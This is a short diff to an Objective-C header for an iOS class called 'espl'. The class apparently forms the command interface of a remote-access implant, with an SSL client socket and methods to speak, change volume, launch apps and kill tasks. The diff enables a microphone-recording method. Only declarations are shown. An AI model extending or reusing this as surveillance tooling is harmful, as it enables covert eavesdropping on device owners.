@@ -9,11 +9,13 @@
 #import <Foundation/Foundation.h>
 #import <AppSupport/CPDistributedMessagingCenter.h>
 #import <AVFoundation/AVFoundation.h>
+#import <AVFoundation/AVAudioSession.h>
 #import <AudioToolbox/AudioToolbox.h>
 #import <CoreFoundation/CFUserNotification.h>
 #import <CoreLocation/CoreLocation.h>
 #import <MediaPlayer/MediaPlayer.h>
 #import <SpringBoardServices/SpringBoardServices.h>
+
 #include <openssl/ssl.h>
 #include <openssl/err.h>
 #include <sys/socket.h>
@@ -24,7 +26,7 @@
 #include <unistd.h>
 #include <dirent.h>
 
-@interface espl : NSObject {
+@interface espl : NSObject <AVAudioRecorderDelegate> {
 @public
   SSL *client_ssl;
   char *terminator;
@@ -70,7 +72,7 @@ extern int SBSLaunchApplicationWithIdentifier(CFStringRef identifier, Boolean su
 - (void)ipod:(NSString *)args;
 - (void)say:(NSString *)string;
 - (void)setVolume:(NSString *)args;
-// - (void)mic:(NSString *)arg;
+- (void)mic:(NSString *)arg;
 - (void)debugLog:(NSString *)string;
 - (void)killTask;
 @end
